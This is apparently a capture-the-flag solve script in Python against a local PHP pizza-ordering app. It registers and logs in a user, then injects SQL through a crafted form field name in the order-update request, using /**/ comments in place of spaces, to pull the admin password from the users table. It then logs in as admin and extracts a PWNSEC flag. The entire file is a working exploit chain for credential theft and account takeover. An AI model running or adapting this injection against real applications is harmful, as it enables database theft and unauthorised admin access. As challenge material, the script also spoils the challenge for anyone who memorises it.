from typing import Dict, Tuple
import requests
import random
import string
import re

URL = "http://localhost:8000"
HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}


def random_string() -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=12))


def register() -> Tuple[str, str]:
    username = random_string()
    password = random_string()

    content = {
        "username": username,
        "password": password,
        "register": True,
    }

    result = requests.post(URL + "/login.php", data=content, headers=HEADERS)
    if result.status_code != 200:
        print("[!] Failed to create user")
        exit(1)

    print(
        f"> Registered user {content['username']} with password {content['password']}"
    )

    return username, password


def login(username: str, password: str) -> Tuple[str, Dict[str, str]]:
    content = {
        "username": username,
        "password": password,
        "login": True,
    }

    result = requests.post(
        URL + "/login.php", data=content, headers=HEADERS, allow_redirects=False
    )
    if "PHPSESSID" not in result.cookies:
        print(f"[!] Failed to login as {content['username']}")
        exit(1)

    session = result.cookies["PHPSESSID"]
    cookies = {"PHPSESSID": session}

    print(f"> Logged in as user {content["username"]} with PHPSESSID={session}")

    return result.text, cookies


def place_order(cookies: Dict[str, str]) -> str:
    content = {
        "pizza_id": "1,2,3,4",
        "quantity": "1,0,0,0",
        "instructions": "",
    }

    result = requests.post(
        URL + "/place_order.php", data=content, headers=HEADERS, cookies=cookies
    )
    if result.status_code != 200:
        print("[!] Failed to place order")
        exit(1)

    order_id = re.findall("ID: (\\d+)", result.text)
    if len(order_id) == 0:
        print("[!] Failed to get order ID")
        exit(1)

    print("> Placed order")
    return order_id[0]


def inject_order(cookies: Dict[str, str], order_id: str):
    injection = (
        "instructions=(SELECT password from users where username = 'admin'),order_id"
    )
    injection = injection.replace(" ", "/**/")

    content = {
        "pizzas[]": [1, 2, 3, 4],
        "quantities[]": [2, 0, 0, 0],
        "instructions": "",
        injection: order_id,
    }

    params = {"id": order_id}

    result = requests.post(
        URL + "/update_order.php",
        params=params,
        headers=HEADERS,
        cookies=cookies,
        data=content,
    )
    if result.status_code != 200:
        print("[!] Failed to update order")
        exit(1)

    print("> Updated order with SQL Injection")


def find_password(cookies: Dict[str, str]) -> str:
    result = requests.get(
        URL + "/view_orders.php",
        headers=HEADERS,
        cookies=cookies,
    )
    if result.status_code != 200:
        print("[!] Failed to view orders")
        exit(1)

    matches = re.findall("<td>(.*)</td>", result.text)
    password = matches[3]

    print(f"> Retrieved admin's password: {password}")
    return password


def find_flag(cookies: Dict[str, str]) -> str:
    result = requests.get(
        URL + "/admin.php",
        headers=HEADERS,
        cookies=cookies,
    )
    if result.status_code != 200:
        print("[!] Failed to load admin dashboard")
        exit(1)

    matches = re.findall("PWNSEC\\{.*\\}", result.text)
    flag = matches[0]
    return flag


username, password = register()
content, cookies = login(username, password)
order_id = place_order(cookies)
inject_order(cookies, order_id)
password = find_password(cookies)
content, cookies = login("admin", password)
flag = find_flag(cookies)

print("Flag is:", flag)
